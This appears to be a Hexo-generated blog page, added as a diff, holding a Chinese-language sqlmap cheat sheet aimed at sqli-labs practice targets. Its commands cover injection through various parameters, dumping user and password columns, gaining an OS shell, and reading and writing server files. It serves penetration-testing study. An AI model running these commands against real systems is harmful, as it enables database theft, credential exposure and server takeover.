@@ -1,0 +1,119 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>sqlmap · Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">sqlmap</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-04-16</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="sqlmap基本命令"><a href="#sqlmap基本命令" class="headerlink" title="sqlmap基本命令"></a>sqlmap基本命令</h1><h2 id="1-几种传参方式"><a href="#1-几种传参方式" class="headerlink" title="1.几种传参方式"></a>1.几种传参方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.GET参数注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br><span class="line">2.POST参数注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;</span><br><span class="line">3.cookie注入 （level&gt;=2时才会检测cookie）  </span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 2</span><br><span class="line">4.user-agent注</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br><span class="line">5.referer注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br><span class="line">6.host注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 5</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-获取数据库信息"><a href="#2-获取数据库信息" class="headerlink" title="2.获取数据库信息"></a>2.获取数据库信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.查看数据库</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --dbs  --batch</span><br><span class="line"></span><br><span class="line">2.查看数据库里面的表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D security --tables --batch</span><br><span class="line"></span><br><span class="line">3.查看数据库表里面的列</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --columns   --batch</span><br><span class="line"></span><br><span class="line">4.查看数据库列里面的具体的值</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C id,password   --dump  --batch</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-获取shell"><a href="#3-获取shell" class="headerlink" title="3.获取shell"></a>3.获取shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  --os-shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-字典破解"><a href="#4-字典破解" class="headerlink" title="4.字典破解"></a>4.字典破解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">使用条件：</span><br><span class="line">1.MySQL数据库版本小于5.0，没有information——schema表。</span><br><span class="line"></span><br><span class="line">2.Microssoft Access数据库。</span><br><span class="line"></span><br><span class="line">3.当前用户没有权限读取系统中保存的数据。</span><br><span class="line"></span><br><span class="line">*暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中</span><br><span class="line">1.暴力破解表名</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security --common-tables --batch</span><br><span class="line"></span><br><span class="line">2.暴力破解列名</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security -Tusers --common-columns --batch</span><br><span class="line"></span><br><span class="line">读取文件/上传文件</span><br><span class="line">1.读取文件</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-read &quot;C:/post.txt&quot;</span><br><span class="line"></span><br><span class="line">2写入文件</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-write &quot;/root/1.txt&quot;</span><br><span class="line"> --file-dest &quot;C:/phpstudy/PHPTutorial/www/1.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-cookie注入"><a href="#5-cookie注入" class="headerlink" title="5.cookie注入"></a>5.cookie注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.sqlmap -u &quot;http://192.168.1.254/Less-20/index.php&quot; --cookie &quot;uname=admin&quot; --level 3 –-current-db ， 枚举当前数据库。</span><br><span class="line">2.sqlmap -u http://192.168.1.254/Less-20/index.php --cookie uname=admin --level 2 -D security -T users -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-POST注入"><a href="#6-POST注入" class="headerlink" title="6.POST注入"></a>6.POST注入</h2><p>使用bp抓包后，复制文本到文档中后执行一下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r /home/forms.txt --level 3 -D security -T users -C&quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-forms-注入"><a href="#7-forms-注入" class="headerlink" title="7.forms 注入"></a>7.forms 注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.254/Less-11&quot; --forms ” #判断有注入点。</span><br><span class="line">sqlmap -u &quot;http://192.168.1.254/Less-11&quot; --forms -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump #枚举内容</span><br></pre></td></tr></table></figure>
+
+<h2 id="8-tamper-脚本"><a href="#8-tamper-脚本" class="headerlink" title="8.tamper 脚本"></a>8.tamper 脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.1.254/Less-25/?id=1 -D security --tables --tamper=symboliclogical.py --level 3 --risk 3 “，猜解表名。结果显示表名为users。</span><br><span class="line"></span><br><span class="line">sqlmap -u http://192.168.1.254/Less-25/?id=1 -D security -T users --columns --tamper=symboliclogical.py --level 3 --risk 3 “,猜解列名。</span><br><span class="line"></span><br><span class="line">sqlmap -u http://192.168.1.254/Less-25/?id=1 -D security -T users -C &quot;id,username&quot; --dump --tamper=symboliclogical.py --level 3 --risk 3 “,猜解内容。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://1768161086.github,io">userq</a></p><p> <span>Link:  </span><a href="http://1768161086.github,io/2025/04/16/sqlmap/">http://1768161086.github,io/2025/04/16/sqlmap/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2025/04/14/XYCTF2025-web/" title="XYCTF2025_web"><span>NextPost ></span><br><span class="nextTitle">XYCTF2025_web</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">sqlmap基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%87%A0%E7%A7%8D%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.</span> <span class="toc-text">1.几种传参方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.</span> <span class="toc-text">2.获取数据库信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.3.</span> <span class="toc-text">3.获取shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%AD%97%E5%85%B8%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.4.</span> <span class="toc-text">4.字典破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">5.cookie注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-POST%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">6.POST注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-forms-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">7.forms 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-tamper-%E8%84%9A%E6%9C%AC"><span class="toc-number">1.8.</span> <span class="toc-text">8.tamper 脚本</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
